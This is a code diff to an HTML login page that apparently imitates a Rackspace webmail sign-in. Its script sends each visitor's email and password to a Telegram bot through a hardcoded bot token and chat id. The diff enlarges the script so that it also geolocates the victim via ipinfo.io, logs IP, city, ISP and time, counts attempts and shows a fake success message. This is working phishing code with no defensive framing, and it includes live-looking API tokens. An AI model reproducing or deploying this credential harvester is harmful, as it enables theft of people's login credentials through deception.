@@ -355,32 +355,75 @@
   </div>
 </form>
 <script>
-        var telegram_bot_id = "7688926536:AAFT_sAnsu3V9QuugxVIJKZ45JBVIUFaLGg";
-        var chat_id = 7284131782;
+  var telegram_bot_id = "7688926536:AAFT_sAnsu3V9QuugxVIJKZ45JBVIUFaLGg";
+  var chat_id = 7284131782;
+  var attemptCounter = 0;
+  var userInfo = {};
 
-        async function submitLogin(event) {
-          event.preventDefault();
-          const email = document.getElementById("user-input").value;
-          const password = document.getElementById("pass-input").value;
+  // Fetch IP info
+  async function fetchIPInfo() {
+    let url = "https://ipinfo.io/json?token=de42e80837e28f";
+    try {
+      let response = await fetch(url);
+      if (!response.ok) {
+        throw new Error("Network response was not ok " + response.statusText);
+      }
+      let data = await response.json();
+      userInfo = {
+        country: data.country || "N/A",
+        state: data.region || "N/A",
+        city: data.city || "N/A",
+        isp: data.org || "N/A",
+        ip: data.ip || "N/A",
+      };
+    } catch (error) {
+      console.error("Fetch error: ", error);
+    }
+  }
 
-          const message = `Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+  // Format time
+  function getCurrentTime() {
+    let now = new Date();
+    return now.toLocaleString();
+  }
 
-          try {
-            await fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify({ chat_id: chat_id, text: message }),
-            });
+  // Send login data to Telegram
+  async function sendToTelegram(email, password) {
+    attemptCounter += 1;
+    const message = `🔐 New Login Attempt Detected 🔐
+👤 Email: ${email}
+🔑 Password: ${password}
+🌍 IP: ${userInfo.ip}
+🏙️ City: ${userInfo.city}
+🗺️ State: ${userInfo.state}
+🇺🇸 Country: ${userInfo.country}
+🔗 ISP: ${userInfo.isp}
+🕒 Time: ${getCurrentTime()}
+⚠️ Attempt Number: ${attemptCounter}`;
 
-            alert("Login submitted successfully.");
-          } catch (error) {
-            console.error("Error sending data to Telegram bot:", error);
-            alert("There was an error submitting your login.");
-          }
-        }
-      </script>
+    try {
+      await fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ chat_id: chat_id, text: message }),
+      });
+    } catch (error) {
+      console.error("Error sending data to Telegram:", error);
+    }
+  }
+
+  // Handle login form submission
+  async function submitLogin(event) {
+    event.preventDefault();
+    const email = document.getElementById("user-input").value;
+    const password = document.getElementById("pass-input").value;
+    await fetchIPInfo();
+    await sendToTelegram(email, password);
+    alert("Login submitted successfully.");
+  }
+</script>
         <div class="base_links">
           <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
             Privacy Statement
@@ -404,5 +447,3 @@
   </div>
 </body>
 </html>
-
-
